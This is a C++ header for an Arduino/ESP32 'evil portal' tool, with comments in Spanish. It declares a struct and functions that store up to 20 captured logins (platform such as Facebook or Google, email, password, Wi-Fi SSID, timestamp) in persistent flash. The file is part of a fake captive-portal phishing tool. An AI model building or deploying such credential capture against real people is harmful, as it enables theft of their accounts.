#ifndef EVIL_PORTAL_LOGS_H
#define EVIL_PORTAL_LOGS_H

#include <Arduino.h>
#include "NVSStore.h"

// ═══════════════════════════════════════════════════════════════════════════
//  EVIL PORTAL LOGS
//  · Almacena credenciales capturadas en NVS (persisten tras reinicios)
//  · Máximo MAX_LOGS entradas (circular — la más vieja se sobrescribe)
//  · Cada log: plataforma + email + password + SSID + timestamp (ms uptime)
// ═══════════════════════════════════════════════════════════════════════════

#define MAX_LOGS        20
#define MAX_FIELD_LEN   63    // longitud máxima por campo (deja 1 para \0)

struct PortalLog {
    char platform[16];        // "Facebook", "Google", etc.
    char email[MAX_FIELD_LEN + 1];
    char password[MAX_FIELD_LEN + 1];
    char ssid[33];            // SSID activo cuando se capturó
    uint32_t timestampSec;    // segundos desde boot cuando se capturó
    uint32_t bootNum;         // boot # en que se capturó
};

// ═══════════════════════════════════════════════════════════════════════════
//  API
// ═══════════════════════════════════════════════════════════════════════════

// Guarda un nuevo log (rotando si ya hay MAX_LOGS)
bool portalLogAdd(const String& platform, const String& email,
                  const String& password, const String& ssid);

// Obtiene número de logs guardados
int  portalLogCount();

// Obtiene log por índice (0 = más reciente)
bool portalLogGet(int idx, PortalLog& out);

// Borra todos los logs
void portalLogClear();

#endif